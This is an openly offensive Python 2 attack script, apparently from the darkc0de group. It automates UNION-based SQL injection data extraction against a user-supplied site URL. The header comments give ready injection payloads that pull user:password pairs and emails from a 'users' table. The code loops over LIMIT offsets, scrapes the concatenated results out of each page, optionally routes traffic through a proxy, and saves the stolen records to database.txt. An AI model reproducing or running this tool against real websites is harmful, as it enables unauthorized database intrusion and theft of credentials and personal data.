#!/usr/bin/python 
#SQL injection data extract

#This script will help extract the data
#in concat(). Use char(58) as your splitter.
#Example: concat_ws(char(58),user,pass)
#Put NUM in the site address for the number
#to incrament.
#Example: 
#www.site.com/news.php?id=-1+union+select+1,concat_ws(char(58),user,pass),3+from+users+limit+NUM,1
#www.site.com/news.php?id=-1+union+select+1,concat(char(58),email),3+from+users+limit+NUM,1
 
#www.darkc0de.com 
#d3hydr8[at]gmail[dot]com 
 
#Range of incraments. 
START = 0
FINISH = 35

#File to save data.
FILE_NAME = "database.txt"

#Add proxy support: Format  127.0.0.1:8080
proxy = "None"
 
import urllib, sys, re, socket, httplib, urllib2

def StripTags(text):
	finished = 0
	while not finished:
		finished  =1
		start =  text.find("<")
		if start >= 0:
			stop = text[start:].find(">")
			if stop >= 0:
				text = text[:start] + text[start+stop+1:]
				finished = 0
	return text
			
print "\n\t   d3hydr8:darkc0de.com SQL/DataExt v1.2"
print "\t------------------------------------------"
 
if len(sys.argv) != 2: 
	print "\n\tUsage: ./dataext.py <site>" 
	print "\n\tEx: ./dataext.py www.site.com/news.php?id=-1+union+select+1,concat_ws(char(58),user,pass),3+from+users+limit+NUM,1\n" 
	print "\tEx: ./dataext.py www.site.com/news.php?id=-1+union+select+1,concat(char(58),user),3+from+users+limit+NUM,1\n" 
	sys.exit(1) 
 
site = sys.argv[1] 
if site[:7] != "http://" and site[:8] != "https://": 
	site = "http://"+site 
if site.find("NUM") == -1: 
	print "\n[-] Site must contain \'NUM\'\n" 
	sys.exit(1) 
if site.find("char(58)") == -1: 
	print "\n[-] Site must contain \'char(58)\'\n" 
	sys.exit(1)
site = site.replace("char(58)","char(58,58)")
	
try:
	if proxy != "None":
		print "\n[+] Testing Proxy..."
		h2 = httplib.HTTPConnection(proxy)
		h2.connect()
		print "[+] Proxy:",proxy
		print "[+] Building Handler"
		proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'})
	else:
		print "\n[-] Proxy Not Given"
		proxy_handler = "None"
except(socket.timeout):
	print "\n[-] Proxy Timed Out"
	sys.exit(1)
except(), msg:
	print msg
	print "\n[-] Proxy Failed"
	sys.exit(1)
 
file = open(FILE_NAME, "a")
print "\n[+] Starting Extraction...\n"
for num in xrange(START,FINISH+1): 
	num = str(num) 
	print "[+] Testing:",num 
	if proxy_handler != "None":
		opener = urllib2.build_opener(proxy_handler)
	else:	
		opener = urllib2.build_opener()
	source = opener.open(site.replace("NUM",num)).read() 
	try:
		match = re.findall("\S+::\S+",StripTags(source))[0]
		if len(match) >= 1:
			match = match.split("::")
			match = match[0]+":"+match[1][:32]
	except(IndexError):
		match = re.findall("::\S+",StripTags(source))
		if len(match) >= 1:
			match = match[0].split("::")[1]
		pass
	if len(match) >= 1:
		file.writelines(match+"\n")
		print "[+] Wrote:",match
	else:
		print "[-] No Data Found"
file.close()
print "\n[-] Done\n"
